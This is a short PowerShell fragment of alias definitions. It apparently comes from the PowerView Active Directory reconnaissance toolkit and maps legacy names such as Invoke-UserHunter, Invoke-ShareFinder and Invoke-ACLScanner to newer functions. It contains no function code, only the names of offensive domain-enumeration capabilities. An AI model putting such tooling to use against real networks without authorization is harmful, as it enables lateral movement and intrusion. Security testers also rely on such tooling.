Set-Alias Get-ObjectAcl Get-DomainObjectAcl
Set-Alias Add-ObjectAcl Add-DomainObjectAcl
Set-Alias Invoke-ACLScanner Find-InterestingDomainAcl
Set-Alias Get-GUIDMap Get-DomainGUIDMap
Set-Alias Get-NetOU Get-DomainOU
Set-Alias Get-NetSite Get-DomainSite
Set-Alias Get-NetSubnet Get-DomainSubnet
Set-Alias Get-NetGroup Get-DomainGroup
Set-Alias Find-ManagedSecurityGroups Get-DomainManagedSecurityGroup
Set-Alias Get-NetGroupMember Get-DomainGroupMember
Set-Alias Get-NetFileServer Get-DomainFileServer
Set-Alias Get-DFSshare Get-DomainDFSShare
Set-Alias Get-NetGPO Get-DomainGPO
Set-Alias Get-NetGPOGroup Get-DomainGPOLocalGroup
Set-Alias Find-GPOLocation Get-DomainGPOUserLocalGroupMapping
Set-Alias Find-GPOComputerAdmin Get-DomainGPOComputerLocalGroupMapping
Set-Alias Get-LoggedOnLocal Get-RegLoggedOn
Set-Alias Invoke-CheckLocalAdminAccess Test-AdminAccess
Set-Alias Get-SiteName Get-NetComputerSiteName
Set-Alias Get-Proxy Get-WMIRegProxy
Set-Alias Get-LastLoggedOn Get-WMIRegLastLoggedOn
Set-Alias Get-CachedRDPConnection Get-WMIRegCachedRDPConnection
Set-Alias Get-RegistryMountedDrive Get-WMIRegMountedDrive
Set-Alias Get-NetProcess Get-WMIProcess
Set-Alias Invoke-ThreadedFunction New-ThreadedFunction
Set-Alias Invoke-UserHunter Find-DomainUserLocation
Set-Alias Invoke-ProcessHunter Find-DomainProcess
Set-Alias Invoke-EventHunter Find-DomainUserEvent
Set-Alias Invoke-ShareFinder Find-DomainShare
Set-Alias Invoke-FileFinder Find-InterestingDomainShareFile
Set-Alias Invoke-EnumerateLocalAdmin Find-DomainLocalGroupMember
Set-Alias Get-NetDomainTrust Get-DomainTrust
Set-Alias Get-NetForestTrust Get-ForestTrust
Set-Alias Find-ForeignUser Get-DomainForeignUser
Set-Alias Find-ForeignGroup Get-DomainForeignGroupMember
Set-Alias Invoke-MapDomainTrust Get-DomainTrustMapping
Set-Alias Get-DomainPolicy Get-DomainPolicyData